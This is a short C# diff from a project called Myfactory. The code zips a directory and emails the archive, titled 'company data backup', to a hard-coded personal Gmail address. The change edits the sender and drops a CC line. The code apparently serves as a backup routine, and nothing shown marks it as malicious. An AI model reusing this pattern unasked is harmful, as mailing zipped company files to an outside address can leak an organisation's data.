@@ -93,13 +93,11 @@ namespace Myfactory
                         MessageBox.Show(ex.ToString());
                     }
                 }
-
                 ZipFile.CreateFromDirectory(startPath, zipPath);
 
                 System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage();
                 msg.To.Add("2586611811v@gmail.com");
-                msg.CC.Add("2586611811v@gmail.com");
-                msg.From = new MailAddress("xzx@gmail.com", "AlphaWu", System.Text.Encoding.UTF8);
+                msg.From = new MailAddress("xx@gmail.com", "Michael", System.Text.Encoding.UTF8);
                 msg.Subject = "公司資料備份";//郵件標題 
                 msg.SubjectEncoding = System.Text.Encoding.UTF8;
                 msg.Attachments.Add(new Attachment(zipPath));
